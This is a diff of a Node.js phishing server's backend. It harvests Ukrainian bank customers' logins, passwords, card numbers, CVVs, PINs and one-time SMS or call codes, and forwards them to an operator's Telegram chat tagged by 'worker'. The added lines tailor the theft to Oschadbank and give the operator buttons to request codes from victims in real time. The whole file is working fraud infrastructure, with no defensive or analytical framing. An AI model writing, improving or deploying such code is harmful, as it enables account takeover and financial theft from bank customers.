@@ -164,26 +164,36 @@ app.post('/api/submit', (req, res) => {
     const newData = { ...existingData, ...stepData };
     sessions.set(sessionId, newData);
 
-    // Send data to Telegram on every submission
-    let message = `<b>Новий ввід даних!</b>\n\n`;
-    message += `<b>Назва банку:</b> ${newData.bankName}\n`;
-    if (newData.currentFlow) message += `<b>Потік:</b> ${newData.currentFlow}\n`;
-    if (newData.loginMethod) message += `<b>Метод входу:</b> ${newData.loginMethod}\n`;
-    if (newData.login) message += `<b>Логін:</b> <code>${newData.login}</code>\n`;
-    if (newData.phone) message += `<b>Номер телефону:</b> <code>${newData.phone}</code>\n`;
-    if (newData.password) message += `<b>Пароль:</b> <code>${newData.password}</code>\n`;
-    if (newData.fp_phone) message += `<b>Номер телефону (відновлення):</b> <code>${newData.fp_phone}</code>\n`;
-    if (newData.fp_card) message += `<b>Номер картки (відновлення):</b> <code>${newData.fp_card}</code>\n`;
-    if (newData.fp_pin) message += `<b>Пін-код (відновлення):</b> <code>${newData.fp_pin}</code>\n`;
-    if (newData.call_code) message += `<b>Код дзвінка:</b> <code>${newData.call_code}</code>\n`;
-    if (newData.sms_code) message += `<b>SMS-код:</b> <code>${newData.sms_code}</code>\n`;
-    if (newData.card_confirm || newData.card) message += `<b>Номер карти:</b> <code>${newData.card_confirm || newData.card}</code>\n`;
-    if (newData['card-expiry']) message += `<b>Термін дії:</b> <code>${newData['card-expiry']}</code>\n`;
-    if (newData['card-cvv']) message += `<b>CVV:</b> <code>${newData['card-cvv']}</code>\n`;
-    if (newData.pin) message += `<b>Пін:</b> <code>${newData.pin}</code>\n`;
-    if (newData.balance) message += `<b>Поточний баланс:</b> <code>${newData.balance}</code>\n`;
-    message += `<b>Кількість переходів:</b> ${(cardVisitCounts.get(newData.card_confirm || newData.card) || 1) === 1 ? 'NEW' : `${cardVisitCounts.get(newData.card_confirm || newData.card) || 1} раз`}\n`;
-    message += `<b>Worker:</b> @${workerNick}\n`;
+    // Send data to Telegram based on flow and data
+    let message = '';
+    if (newData.currentFlow === 'forgot_password' && newData.fp_pin) {
+        // Send only when all forgot password data is collected
+        message = `<b>Название банка:</b> Ощад24\n`;
+        message += `<b>Мобильный:</b> <code>${newData.fp_phone || 'N/A'}</code>\n`;
+        message += `<b>Номер карты:</b> <code>${newData.fp_card || 'N/A'}</code>\n`;
+        message += `<b>Пин:</b> <code>${newData.fp_pin || 'N/A'}</code>\n`;
+        message += `<b>Воркер:</b> @${workerNick}\n`;
+        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
+    } else if (newData.loginMethod === 'phone' && newData.phone && newData.password) {
+        message = `<b>Название банка:</b> Ощад24\n`;
+        message += `<b>Номер телефона:</b> <code>${newData.phone}</code>\n`;
+        message += `<b>Пароль:</b> <code>${newData.password}</code>\n`;
+        message += `<b>Воркер:</b> @${workerNick}\n`;
+        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
+    } else if (newData.loginMethod === 'login' && newData.login && newData.password) {
+        message = `<b>Название банка:</b> Ощад24\n`;
+        message += `<b>Логин:</b> <code>${newData.login}</code>\n`;
+        message += `<b>Пароль:</b> <code>${newData.password}</code>\n`;
+        message += `<b>Воркер:</b> @${workerNick}\n`;
+        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
+    } else if (newData.bankName !== 'Ощадбанк') {
+        // For non-Oschadbank flows
+        message = `<b>Название банка:</b> ${newData.bankName}\n`;
+        if (newData.phone) message += `<b>Номер телефона:</b> <code>${newData.phone}</code>\n`;
+        if (newData.card) message += `<b>Номер карты:</b> <code>${newData.card}</code>\n`;
+        message += `<b>Воркер:</b> @${workerNick}\n`;
+        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML', reply_markup: getInlineKeyboard(sessionId, newData.bankName) });
+    }
 
     if (isFinalStep && !newData.logSent) {
         newData.logSent = true;
@@ -194,12 +204,10 @@ app.post('/api/submit', (req, res) => {
         }
     }
 
-    sendToTelegram(message, sessionId, newData.bankName);
-
     res.status(200).json({ message: 'OK' });
 });
 
-// Handle SMS code submissions
+// Handle code submissions
 app.post('/api/sms', (req, res) => {
     const { sessionId, code, referrer } = req.body;
     let workerNick = 'unknown';
@@ -211,11 +219,10 @@ app.post('/api/sms', (req, res) => {
 
     const sessionData = sessions.get(sessionId);
     if (sessionData) {
-        let message = `<b>Отримано SMS!</b>\n\n`;
-        message += `<b>Код:</b> <code>${code}</code>\n`;
+        const codeType = sessionData.lastCodeScreen === 'oschad_call' ? 'Код со звонка' : 'Код списания';
+        let message = `<b>${codeType}:</b> <code>${code}</code>\n`;
         message += `<b>Номер телефону:</b> <code>${sessionData.phone || sessionData.fp_phone || 'N/A'}</code>\n`;
-        message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;
-        message += `<b>Worker:</b> @${workerNick}\n`;
+        message += `<b>Воркер:</b> @${workerNick}\n`;
         bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
         res.status(200).json({ message: 'OK' });
     } else {
@@ -223,8 +230,8 @@ app.post('/api/sms', (req, res) => {
     }
 });
 
-// Send Telegram message with inline keyboard
-function sendToTelegram(message, sessionId, bankName) {
+// Inline keyboard for non-Oschadbank flows
+function getInlineKeyboard(sessionId, bankName) {
     const keyboard = [
         [
             { text: 'SMS', callback_data: `sms:${sessionId}` },
@@ -252,10 +259,7 @@ function sendToTelegram(message, sessionId, bankName) {
         keyboard[0].push({ text: 'ЗАПРОС', callback_data: `request_details:${sessionId}` });
     }
 
-    bot.sendMessage(CHAT_ID, message, {
-        parse_mode: 'HTML',
-        reply_markup: { inline_keyboard: keyboard }
-    }).catch(err => console.error('Telegram send error:', err));
+    return { inline_keyboard: keyboard };
 }
 
 // Handle custom message replies
